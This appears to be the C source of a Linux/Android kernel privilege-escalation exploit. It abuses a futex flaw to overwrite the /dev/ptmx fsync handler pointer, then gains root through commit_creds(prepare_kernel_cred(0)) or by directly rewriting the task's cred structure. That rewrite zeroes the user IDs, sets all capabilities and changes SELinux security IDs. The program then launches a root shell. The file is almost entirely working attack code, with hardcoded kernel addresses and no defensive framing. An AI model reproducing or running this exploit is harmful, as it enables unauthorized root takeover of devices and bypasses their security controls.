#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include "futex.h"
#include "crusty.h"
#include "cred.h"
#include "ptmx.h"
#include "exploit_utils.h"

#define THREAD_SIZE             8192

#define KERNEL_START            0xc0000000

#define PTMX_DEVICE "/dev/ptmx"

typedef bool (*exploit_callback_t)(void *param);
typedef bool (*exploit_memory_callback_t)(void *mem, size_t length, void *param);

struct cred;
struct task_struct;

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

#if 0
struct kernel_cap_struct {
  unsigned long cap[2];
};

struct cred {
  unsigned long usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned long securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  unsigned char jit_keyring;
  void *thread_keyring;
  void *request_key_auth;
  void *tgcred;
  struct task_security_struct *security;

  /* ... */
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_security_struct {
  unsigned long osid;
  unsigned long sid;
  unsigned long exec_sid;
  unsigned long create_sid;
  unsigned long keycreate_sid;
  unsigned long sockcreate_sid;
};

struct task_struct_partial {
  struct list_head cpu_timers[3];
  struct cred *real_cred;
  struct cred *cred;
  struct cred *replacement_session_keyring;
  char comm[16];
};
#endif

typedef struct _callback_info_t {
  exploit_callback_t func;
  void *param;
  bool result;
} callback_info_t;

static inline struct thread_info *
current_thread_info(void)
{
  register unsigned long sp asm ("sp");
  return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

static bool
is_cpu_timer_valid(struct list_head *cpu_timer)
{
  if (cpu_timer->next != cpu_timer->prev) {
    return false;
  }

  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return false;
  }

  return true;
}

static void
obtain_root_privilege_by_modify_task_cred(void)
{
  struct thread_info *info;
  struct cred *cred;
  struct task_security_struct *security;
  unsigned long addr_limit;
  int i;

  info = current_thread_info();
  addr_limit = info->addr_limit;
  cred = NULL;

  for (i = 0; i < 0x400; i+= 4) {
    struct task_struct_partial *task = ((void *)info->task) + i;

    if (is_cpu_timer_valid(&task->cpu_timers[0])
     && is_cpu_timer_valid(&task->cpu_timers[1])
     && is_cpu_timer_valid(&task->cpu_timers[2])
     && (unsigned long)task->cred >= addr_limit
     && task->real_cred == task->cred) {
      cred = task->cred;
      break;
    }
  }

  if (cred == NULL) {
    return;
  }

  cred->uid = 0;
  cred->gid = 0;
  cred->suid = 0;
  cred->sgid = 0;
  cred->euid = 0;
  cred->egid = 0;
  cred->fsuid = 0;
  cred->fsgid = 0;

  cred->cap_inheritable.cap[0] = 0xffffffff;
  cred->cap_inheritable.cap[1] = 0xffffffff;
  cred->cap_permitted.cap[0] = 0xffffffff;
  cred->cap_permitted.cap[1] = 0xffffffff;
  cred->cap_effective.cap[0] = 0xffffffff;
  cred->cap_effective.cap[1] = 0xffffffff;
  cred->cap_bset.cap[0] = 0xffffffff;
  cred->cap_bset.cap[1] = 0xffffffff;

  security = cred->security;
  if (security) {
    if (security->osid != 0
     && security->sid != 0
     && security->exec_sid == 0
     && security->create_sid == 0
     && security->keycreate_sid == 0
     && security->sockcreate_sid == 0) {
      security->osid = 1;
      security->sid = 1;
    }
  }
}

static void
obtain_root_privilege_by_commit_creds(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static void (*obtain_root_privilege_func)(void);

void
obtain_root_privilege(void)
{
  if (obtain_root_privilege_func) {
    obtain_root_privilege_func();
  }
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;
  int ret;

  printf("[%s]enter\n", __FUNCTION__);
  obtain_root_privilege_func = obtain_root_privilege_by_commit_creds;

  if(0) {
    int c;
    printf("[%s]waiting for any key to continue\n", __FUNCTION__);
    do {
        c = fgetc(stdin);
    } while(c != '\n');
  }
  fd = open(PTMX_DEVICE, O_WRONLY);

  printf("[%s]fsync->\n", __FUNCTION__);
  ret = fsync(fd);
  printf("[%s]<-fsync\n", __FUNCTION__);

  if (getuid() != 0) {
    printf("commit_creds(): failed. Try to hack task->cred.\n");

    obtain_root_privilege_func = obtain_root_privilege_by_modify_task_cred;
    ret = fsync(fd);
  }

  close(fd);

  printf("[%s]leave\n", __FUNCTION__);
  return (ret == 0);
}

static bool
run_callback(void *param)
{
  callback_info_t *info = param;

  info->result = info->func(info->param);

  return true;
}

static bool
attempt_futex_exploit(unsigned long int address,
                     unsigned long int write_value,
                     unsigned long int restore_value,
                     callback_info_t *info)
{
  if (futex_run_exploit(address, write_value, &run_callback, info)) {
    futex_write_value_at_address(address, restore_value);

    return true;
  }

  return false;
}

bool
attempt_exploit(unsigned long int address,
                unsigned long int write_value,
                unsigned long int restore_value,
                exploit_callback_t callback_func,
                void *callback_param)
{
  callback_info_t info;

  info.func = callback_func;
  info.param = callback_param;
  info.result = false;

  // Attempt exploits in most stable order

  printf("Attempt futex exploit...\n");
  if (attempt_futex_exploit(address, write_value, restore_value, &info)) {
    return info.result;
  }
  printf("\n");
  
  return false;
}

static bool
run_exploit(void)
{        
    setup_ptmx_fops_fsync_address();
    if (!ptmx_fops_fsync_address) {
        return false;
    }
    
    printf("prepare_kernel_cred: 0x%08x, commit_creds: 0x%08x, ptmx_fops_fsync_address: 0x%08x\n",
        (void *)prepare_kernel_cred,
        (void *)commit_creds,
        (void *)ptmx_fops_fsync_address);

    return attempt_exploit(ptmx_fops_fsync_address,
                         (unsigned long int)&obtain_root_privilege, 0,
                         run_obtain_root_privilege, NULL);
}

bool
setup_variables(void)
{
    //prepare_kernel_cred = 0xc104f480;
    //commit_creds = 0xc104f200;
    ptmx_fops = 0xc1ab3180;
    //ptmx_fops = 0xc1bc78c0;
    //ptmx_fops = 0xc1aeeda0;
    
  setup_prepare_kernel_cred_address();
  setup_commit_creds_address();
  setup_ptmx_fops_address();

  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
    return true;
  }

  if (!prepare_kernel_cred) {
    printf("Failed to get prepare_kernel_cred address.\n");
  }

  if (!commit_creds) {
    printf("Failed to get commit_creds address.\n");
  }

  if (!ptmx_fops) {
    printf("Failed to get ptmx_fops address.\n");
  }

  return false;
}

void futex_root_test() 
{
    unsigned char buf[4];
    int i;
    printf("[%s]futex_read_values_at_address.\n", __FUNCTION__);
    futex_read_values_at_address(0xC0000000, (int *)buf, sizeof(buf));
    printf("[%s]futex_read_values_at_address called.\n", __FUNCTION__);
    for(i = 0; i < sizeof(buf); i++) {
        printf("%02x, ", buf[i]);
    }
    printf("\n");
    printf("[%s]infinite loop.\n", __FUNCTION__);
    while(1) {
        sleep(1);
    }    
}

void root_with_server()
{    
    printf("sizeof(unsigned long int): %d.\n", sizeof(unsigned long int));
    if (!setup_variables()) {
        printf("Failed to setup variables.\n");
        exit(EXIT_FAILURE);
    }
    
    run_exploit();
    
    if (getuid() != 0) {
        printf("Failed to obtain root privilege.\n");
        system("/bin/sh");
        exit(EXIT_FAILURE);
    }
    
    printf("execute system shell.\n");
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}

int main(int argc, char *argv[])
{
    printf("[%s]enter\n", __FUNCTION__);
    //root_with_server();
    futex_exploit_main();
    printf("[%s]leave\n", __FUNCTION__);
}
